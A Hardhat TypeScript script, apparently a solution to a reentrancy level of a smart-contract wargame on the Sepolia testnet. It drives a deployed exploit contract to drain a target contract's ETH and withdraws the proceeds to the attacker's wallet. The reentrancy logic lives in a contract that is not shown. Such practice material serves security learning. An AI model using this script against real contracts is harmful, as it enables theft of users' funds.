import { ethers } from "hardhat";

/**
 * Execute the reentrancy attack on the Reentrance contract by calling the attack function
 * on the ReentranceExploit contract with some ETH.
 * 
 * Usage: 
 * EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-10-reentrancy/execute-reentrance-exploit.ts --network sepolia
 */
async function main() {
  // For the exploit address, we require it to be provided
  if (!process.env.EXPLOIT_ADDRESS) {
    console.error("Error: No ReentranceExploit contract address provided.");
    console.error("Please provide the address of your deployed ReentranceExploit contract using the EXPLOIT_ADDRESS environment variable.");
    console.error("Example: EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-10-reentrancy/execute-reentrance-exploit.ts --network sepolia");
    return;
  }
  const exploitAddress = process.env.EXPLOIT_ADDRESS;

  // Get target contract address from environment variable or use the one from the exploit contract
  let targetAddress: string;
  if (process.env.TARGET_ADDRESS) {
    targetAddress = process.env.TARGET_ADDRESS;
  } else {
    // We'll get it from the exploit contract
    targetAddress = "";
  }
  
  console.log(`Using ReentranceExploit contract address: ${exploitAddress}`);
  
  // Get the contract factory for ReentranceExploit
  const ReentranceExploit = await ethers.getContractFactory("ReentranceExploit");
  
  // Connect to the deployed contract
  const reentranceExploit = ReentranceExploit.attach(exploitAddress);
  
  console.log(`Connected to ReentranceExploit contract at: ${exploitAddress}`);
  
  // If TARGET_ADDRESS wasn't provided, get it from the exploit contract
  if (!targetAddress) {
    targetAddress = await reentranceExploit.getFunction("targetContract")();
  }
  console.log(`Target contract address: ${targetAddress}`);
  
  const [deployer] = await ethers.getSigners();
  console.log(`Attacker address: ${deployer.address}`);

  try {
    // Check the initial target balance
    console.log("Checking initial target balance...");
    const initialBalance = await reentranceExploit.getFunction("getTargetBalance")();
    console.log(`Initial target balance: ${ethers.formatEther(initialBalance)} ETH`);
    
    if (initialBalance <= 0n) {
      console.error("Target contract has no ETH balance. Cannot perform the attack.");
      return;
    }
    
    // Calculate attack amount - we need enough to trigger the reentrancy
    // A good strategy is to deposit the same amount as the smallest balance in the contract
    // Or a small amount if we're not sure
    const attackAmount = ethers.parseEther("0.1");
    
    // Execute the attack
    console.log(`Executing attack with ${ethers.formatEther(attackAmount)} ETH...`);
    const attackTx = await reentranceExploit.getFunction("attack")({
      value: attackAmount
    });
    
    // Wait for the transaction to be mined
    console.log("Waiting for attack transaction to be mined...");
    const attackReceipt = await attackTx.wait();
    
    // Check the final target balance
    const finalBalance = await reentranceExploit.getFunction("getTargetBalance")();
    console.log(`Final target balance: ${ethers.formatEther(finalBalance)} ETH`);
    
    // Check our exploit contract balance
    const exploitBalance = await ethers.provider.getBalance(exploitAddress);
    console.log(`Exploit contract balance: ${ethers.formatEther(exploitBalance)} ETH`);
    
    // Check if the attack was successful
    if (finalBalance < initialBalance) {
      console.log("\nExploit successful! The Reentrance contract balance has been drained.");
      
      // Withdraw ETH from the exploit contract to our wallet
      console.log("Withdrawing ETH from exploit contract to attacker wallet...");
      const withdrawTx = await reentranceExploit.getFunction("withdraw")();
      await withdrawTx.wait();
      
      console.log("Funds have been withdrawn to your wallet.");
    } else {
      console.log("\nExploit failed. The Reentrance contract balance was not drained.");
    }
    
    // Make sure receipt is not null before accessing its properties
    if (attackReceipt) {
      console.log(`\nAttack transaction details:`);
      console.log(`Hash: ${attackReceipt.hash}`);
      console.log(`Gas used: ${attackReceipt.gasUsed.toString()}`);
      console.log(`Block number: ${attackReceipt.blockNumber}`);
    }
  } catch (error) {
    console.error("\nError executing exploit:", error);
    process.exitCode = 1;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
